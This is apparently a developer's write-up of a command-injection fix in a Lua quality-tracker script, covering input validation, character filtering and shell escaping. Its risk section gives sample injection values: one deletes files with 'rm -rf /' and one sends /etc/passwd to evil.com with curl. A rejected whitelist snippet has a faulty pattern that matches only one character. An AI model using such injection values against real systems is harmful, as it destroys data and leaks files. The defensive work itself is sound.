# Command Injection Fix in Quality Tracker

## Problem Identified

In `scripts/quality_tracker.lua` around lines 49-69, the `scan_directory` function contained a command injection vulnerability where the `root` parameter was directly interpolated into a shell command without proper sanitization:

```lua
-- VULNERABLE CODE
local function scan_directory(root, pattern)
    local files = {}
    
    -- Use find command to get all .lua files
    local cmd = string.format("find '%s' -name '*.lua' -type f 2>/dev/null", root)
    local handle = io.popen(cmd)
    -- ... rest of function
end
```

## Security Risk

This vulnerability could allow an attacker to inject arbitrary shell commands if they could control the `root` parameter. For example:
- `root = "'; rm -rf /; echo '"` could delete files
- `root = "'; curl evil.com/steal?data=$(cat /etc/passwd); echo '"` could exfiltrate data

## Fix Implemented

The fix implements multiple layers of security:

### 1. Input Validation
```lua
-- Sanitize and escape the root path to prevent command injection
if not root or type(root) ~= "string" then
    print("[quality_tracker] Warning: Invalid root directory parameter")
    return files
end
```

### 2. Character Filtering
```lua
-- Validate that root doesn't contain dangerous characters
if root:match("[;&|`$(){}]") then
    print(string.format("[quality_tracker] Warning: Root directory contains unsafe characters: %s", root))
    return files
end
```

**Dangerous characters blocked:**
- `;` - Command separator
- `&` - Background execution / command chaining
- `|` - Pipe operator
- `` ` `` - Command substitution
- `$` - Variable expansion / command substitution
- `()` - Subshell execution
- `{}` - Brace expansion

### 3. Path Escaping
```lua
-- Escape single quotes in the path by replacing ' with '\''
local safe_root = root:gsub("'", "'\\''")

-- Use find command to get all .lua files with properly escaped path
local cmd = string.format("find '%s' -name '*.lua' -type f 2>/dev/null", safe_root)
```

**Escaping mechanism:**
- Replaces each single quote `'` with `'\''`
- This closes the current quoted string, adds an escaped quote, and starts a new quoted string
- Example: `path'with'quotes` becomes `path'\''with'\''quotes`

## Security Testing

The fix was tested with various malicious inputs:

| Input | Result |
|-------|--------|
| `normal/path` | ✅ SAFE: `normal/path` |
| `path with spaces` | ✅ SAFE: `path with spaces` |
| `path'with'quotes` | ✅ SAFE: `path'\''with'\''quotes` |
| `path;with;semicolon` | ❌ REJECTED: contains unsafe characters |
| `path$(dangerous)` | ❌ REJECTED: contains unsafe characters |

## Defense in Depth

The fix implements multiple security layers:

1. **Type Validation**: Ensures input is a string
2. **Character Filtering**: Blocks dangerous shell metacharacters
3. **Path Escaping**: Properly escapes remaining content
4. **Error Handling**: Gracefully handles invalid inputs
5. **Logging**: Records security violations for monitoring

## Impact

- **Security**: Eliminates command injection vulnerability
- **Reliability**: Handles edge cases gracefully
- **Monitoring**: Provides visibility into security events
- **Compatibility**: Maintains existing functionality for valid paths

## Alternative Approaches Considered

### 1. LuaFileSystem (lfs)
```lua
-- Could use lfs.dir() instead of shell commands
local lfs = require("lfs")
for file in lfs.dir(root) do
    -- Process files
end
```
**Pros:** No shell execution, inherently safe
**Cons:** Requires additional dependency, more complex recursive traversal

### 2. Whitelist Validation
```lua
-- Only allow alphanumeric, slash, dash, underscore, dot
if not root:match("^[%w%/%-%_%.]$") then
    return files
end
```
**Pros:** Very restrictive, highly secure
**Cons:** May block legitimate paths with spaces or other valid characters

### 3. Complete Path Sanitization
```lua
-- Remove all potentially dangerous characters
local safe_root = root:gsub("[^%w%/%-%_%.]", "")
```
**Pros:** Simple approach
**Cons:** May break legitimate paths, silent data corruption

## Chosen Approach Rationale

The implemented solution balances security and usability:
- **Blocks clearly dangerous patterns** (command injection attempts)
- **Preserves legitimate paths** (including spaces, which are common)
- **Provides clear error messages** for debugging
- **Uses proven escaping techniques** (standard shell escaping)

## Future Enhancements

1. **Migrate to LuaFileSystem**: For environments where lfs is available
2. **Path Canonicalization**: Resolve relative paths and symlinks
3. **Sandboxing**: Run file operations in restricted environment
4. **Audit Logging**: Log all file system operations for security monitoring

## Conclusion

The command injection vulnerability has been eliminated through a comprehensive defense-in-depth approach that validates, filters, and escapes user input before using it in shell commands. The fix maintains functionality while providing strong security guarantees and clear error reporting.